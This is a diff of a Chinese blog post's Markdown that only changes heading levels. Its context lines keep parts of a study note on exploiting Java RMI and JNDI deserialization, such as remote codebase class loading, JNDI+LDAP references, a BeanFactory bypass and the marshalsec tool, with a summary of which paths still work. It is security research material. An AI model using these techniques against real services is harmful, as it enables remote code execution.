@@ -8,9 +8,9 @@ RMI / JNDI 在反序列化, fastjson 漏洞利用的时候都经常出现, 学�
 
 <!--more-->
 
-# RMI
+## RMI
 
-## 反序列化
+### 反序列化
 
 盗一张图  
 
@@ -471,7 +471,7 @@ public class TestHook {
 ```
 虽然弹出异常说类型错误, 但可以成功触发反序列化.  
 
-## 加载远程类
+### 加载远程类
 
 RMIServer.java
 ```java
@@ -518,9 +518,9 @@ public class RMIClient {
 在 Server 设置一个 `java.rmi.server.codebase`, 这样客户端在 lookup 时发现用到了一个本地不存在的类, 会去从这个 codebase 上加载.  
 在新版里面已经被修复, 利用起来可以用 `marshalsec`, 更方便.  
 
-# JDNI
+## JDNI
 
-## 与 RMI 的关系
+### 与 RMI 的关系
 
 JNDI 全名 `Java Naming and Directory Interface`, 可以看到其实就是将多种协议, 例如远程方法调用 (RMI), 公共对象请求代理体系结构 (CORBA), 轻型目录访问协议 (LDAP) 或域名服务 (DNS). 全部封装到一个接口中, 方便使用.  
 
@@ -564,16 +564,16 @@ public class JNDIServer {
 比如这个 Reference, 客户端查询 wrapper 时, 因为是 `Reference` 且 com.rmb122 这个工厂类不存在, 将会去 codebase `http://127.0.0.1:19133/` 上加载, 利用方式与 rmi 远程对象加载是一样的.  
 在新版中已经修复, 需要手动打开 `System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");`. 而且在我亲测的时候, 就算打开也没用了, 返回的是 `Reference` 对象 233. Debug 了一下发现还需要打开 `com.sun.jndi.ldap.object.trustURLCodebase`, 这才会真正去用 http 协议加载类. 同时因为这是 JNDI 加的内容, 对 RMIClient 是无效的. 会直接返回 Reference 对象.  
 
-## JNDI + LDAP
+### JNDI + LDAP
 
 这其实与 RMI 差不多, 就是换了壳, 不同的地方是 ldap 是有索引等概念的, 可以搜索啊之类的, 且返回的对象也比较复杂, 本身就额外套了一层, 有一些特殊的属性. 具体可以看看底下的参考资料.  
 其中值得一说的是有个属性可以附带反序列化对象, 可以用于高版本 jre 下的 fastjson 打本地反序列化 gadget.  
 
-## 本地 Class 作为 Reference Factory
+### 本地 Class 作为 Reference Factory
 
 上面的是 Reference 是 `Reference("MyClass","com.rmb122", "http://127.0.0.1:19133/");`, 第二个其实就是工厂类, 这里可以利用 `org.apache.naming.factory.BeanFactory` 这个工厂类来配合, 绕过远程加载的限制. 详细可以看看参考资料 [3].  
 
-# 总结
+## 总结
 
 大概如下:  
 RMI remote codebase:  
@@ -601,7 +601,7 @@ JNDI + LDAP 打本地反序列化, 或者 RMI 反序列化:
 JNDI + LDAP 打本地 Reference Factory:  
 目前无限制  
 
-# 参考资料
+## 参考资料
 
 [1] https://paper.seebug.org/1091/  
 [2] https://kingx.me/Exploit-Java-Deserialization-with-RMI.html  
